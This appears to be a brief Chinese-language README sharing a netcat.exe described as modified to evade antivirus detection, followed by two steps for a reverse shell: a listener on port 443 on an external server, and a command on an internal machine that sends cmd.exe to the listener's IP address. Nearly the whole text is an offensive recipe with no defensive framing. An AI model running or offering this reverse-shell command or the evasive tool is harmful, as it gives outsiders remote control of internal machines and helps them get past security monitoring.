# netcat
分享一个免杀的netcat.exe
# 反弹shell步骤:
第1步: 外网服务器执行: netcat -l -p 443

第2步: 内网服务器执行: netcat.exe -t -e cmd.exe 104.62.108.76 443
